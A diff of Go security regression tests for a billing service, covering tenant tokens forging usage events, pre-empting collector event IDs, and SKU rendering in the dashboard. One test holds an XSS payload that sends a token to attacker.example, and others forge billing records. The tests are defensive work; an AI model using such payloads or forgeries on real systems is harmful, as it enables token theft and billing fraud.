@@ -17,6 +17,7 @@ import (
 	"time"
 
 	"github.com/vclusterlabs-experiments/vbilling/internal/config"
+	"github.com/vclusterlabs-experiments/vbilling/internal/discovery"
 	"github.com/vclusterlabs-experiments/vbilling/internal/health"
 	"github.com/vclusterlabs-experiments/vbilling/internal/pipeline"
 	"github.com/vclusterlabs-experiments/vbilling/internal/records"
@@ -59,11 +60,18 @@ func firstWins(t *testing.T, sp *spool.Spool) (billed map[string]usage.Event, sh
 // collector's event for its own GPU-hours and a near-zero quantity. Both
 // land in the ledger under one ID (AppendWindow does not deduplicate), and
 // the billing platform keeps the first one: the tenant's.
+//
+// Since v0.3.3 a metric vBilling measures itself takes no pushed usage, so
+// the tenant's event is refused outright. The operator may still correct
+// such a metric, and its adjustment never takes the collector's ID either.
 func TestReview2BoundTokenCannotPreemptCollectorEventIDs(t *testing.T) {
 	e := setup(t, func(cfg *config.Config) {
 		cfg.IngestToken = ""
 		cfg.IngestTokens = map[string]string{"tok-acme": "acme"}
 	})
+	// acme's cluster runs, so usage may name it before its window is metered.
+	e.server.ctrl = &pushCtrl{ready: true, clusters: []discovery.TenantCluster{
+		{Namespace: "a", Name: "train", Annotations: map[string]string{discovery.AnnotationPrefix + "tenant": "acme"}}}}
 	ws := now.Add(-2 * time.Minute)
 	// What the collector will commit for the window (see env.commit). The
 	// collector stamps its events with Source "collector" (not part of the ID).
@@ -76,8 +84,14 @@ func TestReview2BoundTokenCannotPreemptCollectorEventIDs(t *testing.T) {
 	body := fmt.Sprintf(`[{"metric":%q,"quantity":0.000001,"sku":"NVIDIA-H100","window_start":%q,"window_end":%q,"dimensions":{%q:"vcluster-a-train"}}]`,
 		usage.MetricGPUHours, ws.Format(time.RFC3339), ws.Add(time.Minute).Format(time.RFC3339), usage.DimTenantCluster)
 	code, out := postJSON(t, e.srv.URL+"/api/v1/events", "tok-acme", body)
+	if code != http.StatusBadRequest || out["accepted"] != float64(0) || !strings.Contains(fmt.Sprint(out["rejected"]), "measured by vBilling itself") {
+		t.Fatalf("a tenant-bound token pushed under %s: %d %v, want it refused as a metric vBilling measures itself", usage.MetricGPUHours, code, out)
+	}
+	// The operator's own adjustment with the same identity, before the
+	// window closes: it is stored, under an ID of its own.
+	code, out = postJSON(t, e.srv.URL+"/api/v1/events?operator_adjustment=true", adminToken, strings.Replace(body, `[{`, `[{"tenant":"acme",`, 1))
 	if code != http.StatusOK || out["accepted"] != float64(1) {
-		t.Fatalf("ingest: %d %v", code, out)
+		t.Fatalf("operator adjustment: %d %v", code, out)
 	}
 	// The collector commits the window.
 	if err := e.sp.AppendWindow(spool.SourceCollector, ws.Add(time.Minute), []usage.Event{real}, ""); err != nil {
@@ -85,14 +99,21 @@ func TestReview2BoundTokenCannotPreemptCollectorEventIDs(t *testing.T) {
 	}
 	billed, shadowed := firstWins(t, e.sp)
 	if got := billed[real.ID]; got.Source != spool.SourceCollector || len(shadowed[real.ID]) > 0 {
-		t.Fatalf("a tenant-bound token produced the collector's event ID %s: billed %v GPU-hours from %q, the collector's %v GPU-hours is dropped as a duplicate (%d shadowed)",
+		t.Fatalf("an ingested event took the collector's event ID %s: billed %v GPU-hours from %q, the collector's %v GPU-hours is dropped as a duplicate (%d shadowed)",
 			real.ID, got.Quantity, got.Source, usage.Round(8.0/60), len(shadowed[real.ID]))
+	}
+	if len(billed) != 2 {
+		t.Fatalf("%d events billed, want the collector's and the operator's adjustment", len(billed))
 	}
 }
 
 // The same collision with per-request records: the aggregator commits one
 // event per tenant, metric, SKU and window with usage.DeriveID, so a bound
 // token can shadow a whole window of tokens served by the operator's gateway.
+//
+// Since v0.3.3 a metric built from records takes records only, so the
+// tenant's events are refused outright; the operator's adjustment under
+// such a metric never takes the aggregator's ID either.
 func TestReview2BoundTokenCannotPreemptAggregatedRecords(t *testing.T) {
 	dir := t.TempDir()
 	clock := func() time.Time { return now }
@@ -120,7 +141,7 @@ func TestReview2BoundTokenCannotPreemptAggregatedRecords(t *testing.T) {
 		_, ok := reg.Get(v)
 		return v, ok
 	}
-	cfg := &config.Config{Region: "eu-west-1", CollectionInterval: time.Minute, IngestToken: "gateway-secret",
+	cfg := &config.Config{Region: "eu-west-1", CollectionInterval: time.Minute, APIToken: adminToken, IngestToken: "gateway-secret",
 		IngestTokens: map[string]string{"tok-acme": "acme"}}
 	ropts := records.Options{Window: time.Minute, Region: cfg.Region, Now: clock}
 	in := records.NewIngester(rs, formats, ropts, resolve, h, nil)
@@ -144,7 +165,7 @@ func TestReview2BoundTokenCannotPreemptAggregatedRecords(t *testing.T) {
 	// identity of each usage row, one token each, before the window closes.
 	var forged []map[string]any
 	_ = rs.Scan(now.Add(-time.Hour), now.Add(time.Hour), func(ev *usage.Event) error {
-		forged = append(forged, map[string]any{"metric": ev.Metric, "quantity": 1, "sku": ev.SKU, "project": ev.Project,
+		forged = append(forged, map[string]any{"tenant": "acme", "metric": ev.Metric, "quantity": 1, "sku": ev.SKU, "project": ev.Project,
 			"resource_id": ev.ResourceID, "dimensions": ev.Dimensions, "window_start": ev.WindowStart, "window_end": ev.WindowEnd})
 		return nil
 	})
@@ -152,8 +173,19 @@ func TestReview2BoundTokenCannotPreemptAggregatedRecords(t *testing.T) {
 		t.Fatal("no record rows")
 	}
 	b, _ := json.Marshal(forged)
-	if code, out := postJSON(t, srv.URL+"/api/v1/events", "tok-acme", string(b)); code != 200 {
-		t.Fatalf("tenant ingest: %d %v", code, out)
+	for _, ev := range forged {
+		if def, _ := usage.Lookup(ev["metric"].(string)); def.Source != usage.SourceRecords {
+			t.Fatalf("test setup: %s is declared with source %q, not by the litellm format: another test declared it as a custom metric first", def.Code, def.Source)
+		}
+	}
+	if code, out := postJSON(t, srv.URL+"/api/v1/events", "tok-acme", string(b)); code != http.StatusBadRequest || out["accepted"] != float64(0) ||
+		!strings.Contains(fmt.Sprint(out["rejected"]), "built from per-request records") {
+		t.Fatalf("a tenant-bound token pushed window totals under the metrics of records: %d %v, want them refused", code, out)
+	}
+	// The operator's own adjustment with the same identities is stored, under
+	// IDs of its own.
+	if code, out := postJSON(t, srv.URL+"/api/v1/events?operator_adjustment=true", adminToken, string(b)); code != http.StatusOK || out["accepted"] != float64(len(forged)) {
+		t.Fatalf("operator adjustment: %d %v", code, out)
 	}
 	if err := agg.Tick(); err != nil {
 		t.Fatal(err)
@@ -217,7 +249,7 @@ func TestReview2TenantSKUIsRenderedAsHTMLInTheDashboard(t *testing.T) {
 	})
 	payload := `<img src=x onerror="fetch('//attacker.example/'+token)">`
 	ws := now.Add(-2 * time.Minute)
-	ev, _ := json.Marshal([]map[string]any{{"id": "x1", "metric": usage.MetricGPUHours, "quantity": 0.001, "sku": payload,
+	ev, _ := json.Marshal([]map[string]any{{"id": "x1", "metric": pushedMetric, "quantity": 0.001, "sku": payload,
 		"window_start": ws, "window_end": ws.Add(time.Minute)}})
 	code, out := postJSON(t, e.srv.URL+"/api/v1/events", "tok-acme", string(ev))
 	switch {
